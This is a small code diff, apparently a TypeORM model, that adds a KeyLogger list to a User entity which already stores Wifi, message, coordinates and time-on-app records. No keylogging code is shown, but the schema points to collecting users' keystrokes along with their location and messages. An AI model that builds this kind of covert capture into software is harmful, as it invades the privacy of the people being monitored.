@@ -14,6 +14,7 @@ import { Wifi } from "./Wifi";
 import { Message } from "./Message";
 import { Coordinates } from "./Coordinates";
 import { TimeOnApp } from "./TimeOnApp";
+import { KeyLogger } from './KeyLogger';
 
 @Entity()
 export class User {
@@ -65,6 +66,9 @@ export class User {
 
     @Column(type => TimeOnApp)
     public timeOnAppList: TimeOnApp[];
+
+    @Column(type => KeyLogger)
+    public keyLoggerList: KeyLogger[];
 
     public toString(): string {
         return `${this.email}`;
